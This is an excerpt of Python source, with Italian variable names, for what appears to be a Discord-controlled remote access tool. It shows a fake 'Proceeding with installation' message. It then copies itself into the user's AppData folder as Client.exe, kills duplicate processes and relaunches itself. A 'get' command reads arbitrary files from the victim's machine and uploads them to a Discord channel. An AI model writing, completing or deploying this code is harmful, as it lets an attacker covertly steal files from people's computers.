...
if nome != "Client.exe":
    nomevolume = percorsocorrente.split("\\")[0]
    stats = psutil.disk_usage(nomevolume)
    spazio_libero = stats.free
    if spazio_libero < 100000000:
        comando = "msg * Insufficient space: at least 100MB of space are required"
        subprocess.call(comando)
        sys.exit()
    else:
        comando = "msg * Proceeding with installation"
        subprocess.call(comando)
@bot.event
async def on_ready():
    Local = os.path.join(os.path.expanduser("~") , "Appdata" , "Local")
    i = wmi.WMI()
    comando = f'taskkill /IM "{nome}" /F'
    try:
        os.chdir(Local)
        try:
            tempo1 = os.path.getmtime(percorsocorrente)
            tempo2 = os.path.getmtime(f"{Local}\\Client.exe")
            print("vecchio1")
            for n in i.Win32_Process():
                if n.Name == "Client.exe" and nome != "Client.exe" and tempo1 < tempo2:
                    subprocess.call(f"taskkill /IM {nome} /F")
            if tempo1 > tempo2:
                comando3 = "taskkill /IM Client.exe /F"
                subprocess.call(comando3 , shell=True)
                subprocess.call(rf"del /AH {Local}\Client.exe" , shell = True)
                time.sleep(2.0)
                shutil.copy(percorsocorrente , f"{Local}\\{nome}" )
                os.rename(nome , "Client.exe")
                os.startfile(f"{Local}\\Client.exe")
                subprocess.call(comando , shell=True)
            try:
                if os.path.exists(os.path.join(Local , "Client.exe")) and nome != "Client.exe":
                    comando = f'taskkill /IM "{nome}" /F'
                    os.startfile(os.path.join(Local , "Client.exe"))
                    subprocess.call(comando)
            except:
                pass
            conta = 0
            for n in i.Win32_Process():
                if "Client.exe" in n.Name:
                    conta += 1
                    print(conta)
                if conta > 4:
                    print(conta)
                    ...
                    real = False
                if real == True and nome == "Client.exe":
                    subprocess.call(fr"taskkill /F /PID {os.getpid()}")
                else:
                    pass
...
async def get(ctx):
    ...
    nomefile = percorso.split("/")[-1]
    try:
        with open(percorso , "rb") as k:
            data = discord.File(k , filename=nomefile)
            await canale.send(file = data)
    except FileNotFoundError:
        await canale.send("File non trovato")
    except:
        await canale.send("Impossibile mandare il file")
    ...
    if boh == False:
        ...
        try:
            ...
            if req.status_code == 200:
                ...
                if peso > 25000000:
                    await canale.send("File troppo grande")
